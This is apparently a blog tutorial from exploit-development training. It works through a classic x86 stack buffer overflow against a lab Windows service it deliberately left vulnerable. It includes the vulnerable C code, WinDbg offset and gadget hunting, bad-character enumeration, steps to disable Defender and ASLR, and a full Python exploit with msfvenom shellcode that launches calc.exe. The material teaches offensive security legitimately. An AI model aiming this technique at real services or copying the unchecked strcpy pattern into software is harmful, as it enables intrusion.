---
slug: "stack-buffer-overflows-eip-control-to-code-execution"

title: "Stack Buffer Overflows - EIP Control to Code Execution"
date: 2026-04-30T08:12:33+05:45
draft: false

description: "A technical breakdown of x86 stack buffer overflow exploitation against a network service - EIP hijacking, JMP ESP gadget selection, bad character enumeration, shikata_ga_nai decoder mechanics, and shellcode delivery."
tags: [Exploit-Development, x86, OSED, WinDbg, Stack-Overflow, Assembly, Shellcode]
categories: [OSED]

cover:
  image: "/img/OSED.png"
  alt: "CIPHERFLARE"
---

## Lab Setup

Three things need to be sorted on the Windows lab machine before any of this works cleanly.

**Antivirus off.** Shellcode and exploit scripts will be flagged and quarantined before they ever run. Real-time protection, tamper protection, SmartScreen, all of it needs to go. Turn off tamper protection first, then real-time protection. If you do it the other way around, Defender re-enables itself.

**ASLR disabled system-wide.** Windows randomizes module base addresses by default, which means every time the program runs, the modules load at different addresses. For foundational exploit development you need those addresses to stay the same between runs so any gadget address you hardcode in a payload is still valid the next time. This registry key forces that:

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v MoveImages /t REG_DWORD /d 0 /f
```

Reboot after applying it.

**DEP disabled for the target binary.** Data Execution Prevention marks stack memory as non-executable at the OS level. If it is enabled, the CPU will refuse to execute code sitting on the stack even if you redirect execution there perfectly. For this lab the binary gets compiled without NX compatibility so the stack stays executable. In real targets this protection gets bypassed with ROP chains rather than compiled away, but that comes later.

---

## The Vulnerable Service

```c
#include <stdio.h>
#include <string.h>
#include <winsock2.h>

void vulnerable(char *input) {
    char buf[64];
    printf("[*] Copying input into buf[64]...\n");
    strcpy(buf, input);
    printf("[+] Done. You entered: %s\n", buf);
}

int main() {
    WSADATA wsa;
    SOCKET s, client;
    struct sockaddr_in server, addr;
    int addrlen = sizeof(addr);
    char input[1024];

    WSAStartup(MAKEWORD(2, 2), &wsa);
    s = socket(AF_INET, SOCK_STREAM, 0);

    server.sin_family      = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port        = htons(4444);

    bind(s, (struct sockaddr *)&server, sizeof(server));
    listen(s, 1);

    printf("[*] Listening on port 4444...\n");

    client = accept(s, (struct sockaddr *)&addr, &addrlen);
    printf("[+] Connection accepted\n");

    recv(client, input, sizeof(input), 0);
    printf("[*] Received input, passing to vulnerable()\n");

    vulnerable(input);

    closesocket(client);
    WSACleanup();
    return 0;
}
```

The vulnerability is in `vulnerable()`. The line `strcpy(buf, input)` copies whatever came in over the network into a 64-byte buffer with no length check whatsoever. `strcpy` keeps copying bytes until it hits a null byte in the source, regardless of how large the destination is. Send more than 64 bytes and it writes straight past the end of `buf` into whatever memory sits above it on the stack.

What sits above it turns out to be the saved base pointer and then the return address. And that is where things get interesting.

Compiled from Linux with protections stripped:

```bash
i686-w64-mingw32-gcc -o vuln.exe vuln.c \
    -fno-stack-protector \
    -mpreferred-stack-boundary=2 \
    -lws2_32 \
    -Wl,--disable-nxcompat
```

What each flag does:

- `-fno-stack-protector` disables stack canaries. These are values the compiler inserts between the buffer and the return address that get checked before the function returns. If they are corrupted, the process aborts before `ret` even executes.
- `-mpreferred-stack-boundary=2` uses 4-byte stack alignment instead of 16-byte. Keeps the frame layout clean and predictable.
- `-lws2_32` links the Windows Sockets library for the network code.
- `-Wl,--disable-nxcompat` tells the linker to mark the binary as not requiring DEP. Without this flag, DEP applies and the stack is non-executable.

---

## The Stack Frame

Before calculating offsets there needs to be a clear picture of what the stack looks like when `vulnerable()` is running.

When `main()` calls `vulnerable(input)`, the cdecl calling convention applies. The caller pushes the argument (a 4-byte pointer to `input`) onto the stack, then executes `CALL`. The `CALL` instruction pushes the return address (the address of the next instruction in `main`) and jumps to `vulnerable`:

```nasm
push input_pointer      ; 4-byte pointer to input buffer
call vulnerable         ; pushes return address, jumps to function
```

Inside `vulnerable()`, the prologue sets up the stack frame:

```nasm
push ebp                ; save caller's base pointer
mov ebp, esp            ; anchor EBP to current stack top
sub esp, 64             ; reserve 64 bytes for buf
```

After the prologue finishes, the stack looks like this:

```
High Address
┌──────────────────┐
│  input pointer   │  [ebp+8]   argument pushed by caller
├──────────────────┤
│  return address  │  [ebp+4]   pushed by CALL
├──────────────────┤
│  saved EBP       │  [ebp]     EBP register points here
├──────────────────┤
│                  │
│    buf[64]       │            64 bytes of local buffer
│                  │
│                  │            ESP points here
└──────────────────┘
Low Address
```

The stack grows downward toward lower addresses. `buf` sits below saved EBP in memory. When `strcpy` writes into `buf`, it starts at the bottom of the buffer and fills upward, heading straight toward saved EBP and then the return address.

The offset math is straightforward:

```
64 bytes    buf itself
 4 bytes    saved EBP above buf
---------
68 bytes    total to reach the return address
```

Bytes at offset 68 through 71 overwrite the return address. When the function's epilogue runs and `ret` executes, it pops those 4 bytes into EIP. The CPU jumps to whatever address is there. Put a controlled address in those bytes and execution is hijacked.

---

## How the Epilogue Still Works

The overflow writes `0x41414141` over the saved EBP value on the stack. A reasonable question is whether this breaks the epilogue before `ret` even fires.

The epilogue for `vulnerable()` is:

```nasm
mov esp, ebp        ; collapse local frame, reset ESP
pop ebp             ; restore saved EBP from stack into EBP register
ret                 ; pop return address into EIP
```

The key detail is that `mov esp, ebp` reads from the EBP **register**, not from the saved value on the stack. The EBP register was set during the prologue with `mov ebp, esp` and was never touched again during the function body. It still holds the correct address pointing at the saved EBP location on the stack.

So the epilogue runs correctly. `mov esp, ebp` resets ESP to the right place. `pop ebp` loads the corrupted `0x41414141` into the EBP register, which breaks the caller's frame, but by this point execution is being taken over so it does not matter. Then `ret` pops the overwritten return address into EIP and the CPU jumps there.

---

## Confirming EIP Control

Theory needs to be verified. A quick script confirms the offset:

```python
import socket

payload = b"A" * 68 + b"B" * 4 + b"C" * 100

s = socket.socket()
s.connect(("192.168.122.85", 4444))
s.send(payload)
s.close()
```

68 `A`s to fill `buf` and overwrite saved EBP. 4 `B`s at offset 68 to land on the return address. 100 `C`s as padding.

WinDbg crash output:

```
(15cc.229c): Access violation - code c0000005 (second chance)
eax=00000066 ebx=019e0df8 ecx=00000000 edx=00df0000 esi=019e0e88 edi=00000059
eip=42424242 esp=0126f8c4 ebp=41414141 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
42424242 ??              ???
```

EIP is `42424242` which is `BBBB`. EBP is `41414141` which is `AAAA`. The offset is confirmed at 68 bytes.

There is something else worth noting in the crash output. ESP is sitting at `0126f8c4` and it is pointing directly at the `C`s. After `ret` pops the return address into EIP, ESP advances by 4 bytes and lands on whatever came immediately after the return address in the payload. That is attacker-controlled data sitting right at ESP. This is the mechanism that makes `JMP ESP` useful.

---

## Finding a JMP ESP Gadget

With EIP control confirmed, the next step is figuring out where to redirect execution. The goal is to execute shellcode, and the shellcode will be placed right after the overwritten return address in the payload. At the moment `ret` fires, ESP points directly at that shellcode.

So what is needed is an instruction somewhere in memory that says "jump to whatever ESP points at." In x86, `JMP ESP` does exactly that. Its opcode is two bytes: `FF E4`.

The challenge is finding a copy of those two bytes at an address that is stable and predictable. If the address changes between runs, the hardcoded value in the payload becomes wrong and the exploit crashes. This is exactly why ASLR was disabled earlier.

**Step 1: Find out what modules are loaded.**

In WinDbg, the `lm` command lists all loaded modules with their start and end addresses:

```
0:000> lm
start    end        module name
00400000 0043c000   vuln
75c80000 75d47000   msvcrt
75de0000 75ed0000   KERNEL32
77640000 7790a000   KERNELBASE
77950000 77b0f000   ntdll
```

Each line shows the start address, end address, and name of a loaded module. These are the regions of memory available to search for a gadget.

**Step 2: Calculate the search range.**

To search a module for `FF E4`, the `s` command in WinDbg needs a start address and a length. The length is calculated by subtracting the start address from the end address.

For `msvcrt`:

```
end   - start  = length
75d47000 - 75c80000 = c7000
```

So the search length for `msvcrt` is `0xc7000` bytes, which covers the entire module.

**Step 3: Search for the opcode.**

```
0:000> s 0x75c80000 L0xc7000 ff e4
75d099fd  ff e4 00 00 57 e8 39 ee-fb ff 83 c4 14 8b bd 34
```

The `s` command syntax is `s <start> L<length> <bytes>`. WinDbg found `FF E4` at address `0x75d099fd` inside `msvcrt.dll`.

**Step 4: Verify it is actually JMP ESP.**

Finding the bytes is not enough. They need to be disassembled to confirm they form a valid instruction at that address:

```
0:000> u 0x75d099fd L1
msvcrt!_winput_s_l+0xa5d:
75d099fd ffe4            jmp     esp
```

Confirmed. `0x75d099fd` contains `JMP ESP`.

**Step 5: Verify the address is stable.**

With ASLR disabled system-wide, restarting the program should load `msvcrt` at the same base address. Running `lm` across multiple sessions confirmed `msvcrt` consistently loading at `0x75c80000`, which means `0x75d099fd` is reliable.

One more check: the address itself must not contain any null bytes, because `strcpy` stops copying at `0x00`. Looking at `75 d0 99 fd`, there are no null bytes. The gadget address is clean.

---

## Little-Endian Packing

x86 is little-endian. Multi-byte values are stored in memory with the least significant byte at the lowest address. The address `0x75d099fd` does not go into the payload as-is. It gets stored reversed: `fd 99 d0 75`.

Python handles this with `struct.pack`:

```python
import struct
jmp_esp = struct.pack("<I", 0x75d099fd)
# produces: b'\xfd\x99\xd0\x75'
```

The `<` means little-endian. `I` is an unsigned 32-bit integer. Getting the byte order wrong loads a garbage address into EIP and the exploit crashes with no obvious indication of the cause.

---

## Bad Character Enumeration

`strcpy` stops at `0x00`. Any null byte anywhere in the payload truncates everything that follows it. Other byte values might also get corrupted depending on how the service processes input, and shellcode containing a corrupted byte will silently fail mid-execution.

The process for finding bad characters is to send every possible byte value through the vulnerability and compare what arrives on the stack against what was sent:

```python
import socket

bad_chars = bytes(range(1, 256))
payload = b"A" * 68 + b"B" * 4 + bad_chars

s = socket.socket()
s.connect(("192.168.122.85", 4444))
s.send(payload)
s.close()
```

After the crash, `db esp L100` in WinDbg shows the raw bytes that landed on the stack. Comparing byte by byte against the expected sequence `01 02 03 ... fd fe ff` reveals any bytes that went missing or got changed.

For this target, every byte from `0x01` through `0xff` arrived intact. The only bad character is:

- `0x00` — null terminator, kills `strcpy` immediately

---

## Generating Shellcode

With bad characters confirmed, `msfvenom` generates shellcode that avoids them:

```bash
msfvenom -p windows/exec CMD=calc.exe -b "\x00" -f python
```

```
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 220 (iteration=0)
Payload size: 220 bytes
```

`shikata_ga_nai` is a polymorphic XOR encoder. It wraps the shellcode in a self-decoding stub. When the shellcode runs, the decoder executes first. It XORs each encoded byte back to its original value and then jumps into the decoded shellcode. The encoded form sitting in the payload never actually contains the bad characters. They exist only in the decoded form that gets reconstructed at runtime in memory.

---

## The Decoder Problem and the Fix

`shikata_ga_nai` uses ESP as scratch space while it is decoding. It pushes and pops temporary values relative to ESP as part of the XOR loop. After `JMP ESP` fires, ESP points at the very first byte of the shellcode. The decoder starts running and its scratch writes land on top of the encoded bytes it has not decoded yet. The shellcode corrupts itself before it finishes unpacking and crashes.

The fix is to create distance between ESP and the start of the shellcode before the decoder begins running.

**Option 1: NOP sled.** Prepend `0x90` bytes before the shellcode. Each NOP is a single byte instruction that does nothing except advance EIP by one. ESP does not move. After sliding through 16 NOPs, EIP is pointing at the shellcode but ESP is still 16 bytes behind, sitting in the sled. When the decoder runs and writes scratch values relative to ESP, those writes land in the NOP sled area, which has already been executed and does not matter.

```python
payload = b"A" * 68 + jmp_esp + b"\x90" * 16 + buf
```

**Option 2: sub esp prefix.** Prepend `sub esp, 0x10` before the shellcode. This is the opcode `\x83\xec\x10`. It is a single 3-byte instruction that subtracts 16 from ESP, moving it 16 bytes below the shellcode. The decoder then has clean scratch space that does not overlap with the encoded payload at all.

```python
payload = b"A" * 68 + jmp_esp + b"\x83\xec\x10" + buf
```

Both approaches solve the same problem. The `sub esp` version costs 3 bytes instead of 16, which is worth knowing when buffer space is tight.

---

## The Full Exploit

```python
import socket
import struct
import sys

TARGET_IP   = "192.168.122.85"
TARGET_PORT = 4444

def exploit():
    print(f"[*] Target     : {TARGET_IP}:{TARGET_PORT}")
    print(f"[*] Gadget     : JMP ESP @ 0x75d099fd (msvcrt.dll)")
    print(f"[*] Bad chars  : \\x00")
    print(f"[*] Encoder    : x86/shikata_ga_nai")

    jmp_esp = struct.pack("<I", 0x75d099fd)

    # msfvenom -p windows/exec CMD=calc.exe -b "\x00" -f python
    buf  = b""
    buf += b"\xda\xcf\xbf\xb9\x47\xc3\xec\xd9\x74\x24\xf4\x58"
    buf += b"\x33\xc9\xb1\x31\x31\x78\x18\x03\x78\x18\x83\xe8"
    buf += b"\x45\xa5\x36\x10\x5d\xa8\xb9\xe9\x9d\xcd\x30\x0c"
    buf += b"\xac\xcd\x27\x44\x9e\xfd\x2c\x08\x12\x75\x60\xb9"
    buf += b"\xa1\xfb\xad\xce\x02\xb1\x8b\xe1\x93\xea\xe8\x60"
    buf += b"\x17\xf1\x3c\x43\x26\x3a\x31\x82\x6f\x27\xb8\xd6"
    buf += b"\x38\x23\x6f\xc7\x4d\x79\xac\x6c\x1d\x6f\xb4\x91"
    buf += b"\xd5\x8e\x95\x07\x6e\xc9\x35\xa9\xa3\x61\x7c\xb1"
    buf += b"\xa0\x4c\x36\x4a\x12\x3a\xc9\x9a\x6b\xc3\x66\xe3"
    buf += b"\x44\x36\x76\x23\x62\xa9\x0d\x5d\x91\x54\x16\x9a"
    buf += b"\xe8\x82\x93\x39\x4a\x40\x03\xe6\x6b\x85\xd2\x6d"
    buf += b"\x67\x62\x90\x2a\x6b\x75\x75\x41\x97\xfe\x78\x86"
    buf += b"\x1e\x44\x5f\x02\x7b\x1e\xfe\x13\x21\xf1\xff\x44"
    buf += b"\x8a\xae\xa5\x0f\x26\xba\xd7\x4d\x2c\x3d\x65\xe8"
    buf += b"\x02\x3d\x75\xf3\x32\x56\x44\x78\xdd\x21\x59\xab"
    buf += b"\x9a\xe3\xc2\xcb\xb4\x93\xac\x61\xf9\xf9\x4e\x5c"
    buf += b"\x3d\x04\xcd\x55\xbd\xf3\xcd\x1f\xb8\xb8\x49\xf3"
    buf += b"\xb0\xd1\x3f\xf3\x67\xd1\x15\x90\xe6\x41\xf5\x79"
    buf += b"\x8d\xe1\x9c\x85"

    sub_esp = b"\x83\xec\x10"           # sub esp, 0x10

    payload  = b"A" * 68                # fill buf[64] + overwrite saved EBP
    payload += jmp_esp                  # overwrite return address with JMP ESP gadget
    payload += sub_esp                  # move ESP away before decoder runs
    payload += buf                      # shikata_ga_nai encoded shellcode

    print(f"[*] Payload    : {len(payload)} bytes")
    print(f"[*] Layout     : [A x68] [JMP ESP] [sub esp,10] [shellcode x{len(buf)}]")

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TARGET_IP, TARGET_PORT))
        print(f"[+] Connected")
        s.send(payload)
        print(f"[+] Payload sent")
        s.close()
        print(f"[+] Done. Check target for calc.exe")
    except ConnectionRefusedError:
        print(f"[-] Connection refused. Is the service running?")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    exploit()
```

---

## Payload Layout

```
Offset 0-67   :  A x 68         fills buf[64], overwrites saved EBP
Offset 68-71  :  fd 99 d0 75    JMP ESP address in little-endian
Offset 72-74  :  83 ec 10       sub esp, 0x10 (3 bytes)
Offset 75+    :  shellcode       220 bytes, shikata_ga_nai encoded
Total         :  295 bytes
```

---

## Execution Chain

Here is exactly what happens from the moment the payload lands:

1. The service receives 295 bytes into `input` via `recv()`.
2. `vulnerable(input)` gets called. The prologue sets up the stack frame.
3. `strcpy(buf, input)` copies the payload into `buf`. It fills 64 bytes into the buffer, overwrites saved EBP with `0x41414141`, and overwrites the return address with `0x75d099fd`.
4. `printf` runs and prints the garbled output. No crash yet because only stack data was corrupted, not any executing code.
5. The epilogue runs. `mov esp, ebp` collapses the local frame. `pop ebp` loads `0x41414141` into EBP. `ret` pops `0x75d099fd` into EIP.
6. The CPU jumps to `0x75d099fd` inside `msvcrt.dll`. The instruction at that address is `JMP ESP`.
7. `JMP ESP` jumps to whatever ESP currently holds. ESP is pointing at offset 72, which is `\x83\xec\x10`.
8. `sub esp, 0x10` executes. ESP moves 16 bytes downward, away from the shellcode.
9. The shikata_ga_nai decoder stub runs. Its scratch writes relative to ESP land 16 bytes below the shellcode. No corruption.
10. The decoder finishes unpacking and jumps into the decoded shellcode.
11. The shellcode resolves Windows API addresses and calls `WinExec("calc.exe", 0)`.
12. `calc.exe` opens on the target.

---

## WinDbg Stack Dump at Execution

Stack contents captured right as the shellcode was executing, showing the `sub esp` prefix at `011ff636` and the fully decoded shellcode in memory including `calc.exe` in ASCII at `011ff714`:

```
011ff634  00 00 00 00 00 00 ff ff-83 ec 10 d9 ec ba 67 d7
011ff644  2f 5e d9 74 24 f4 5f 29-c9 b1 31 31 57 18 83 c7
011ff654  04 03 57 14 e2 f5 fc e8-82 00 00 00 60 89 e5 31
011ff664  c0 64 8b 50 30 8b 52 0c-8b 52 14 8b 72 28 0f b7
011ff674  4a 26 31 ff ac 3c 61 7c-02 2c 20 c1 cf 0d 01 c7
011ff714  6c 63 2e 65 78 65 00 01-00 0c bb 21 02 c0 b7 5d
```

---

## Key Takeaways

`ret` is just `pop eip`. Control what sits at ESP when `ret` executes and you control the CPU. That one primitive is what every stack overflow is built on.

Knowing the stack layout cold matters more than any tool. Offset to EIP, what sits between the buffer and the return address, which direction the overflow travels. These need to be automatic before touching an exploit.

Every byte in the payload has a job. Filler, gadget address, decoder protection, shellcode. One wrong byte causes a crash with no obvious indication of where it went wrong. Build and verify each piece separately before assembling the full payload.

Bad character enumeration is not optional. A single corrupted byte mid-shellcode produces a failure that looks identical to any other crash. Do the enumeration before generating shellcode, every time.

The debugger tells the truth. `dd esp`, `db esp`, `r eip`, `u eip`. When something crashes, the answer is in the register dump and the stack contents. Not in the source code, not in intuition.

---

*This exploit runs against a deliberately vulnerable lab binary compiled without modern mitigations. It is a learning exercise.*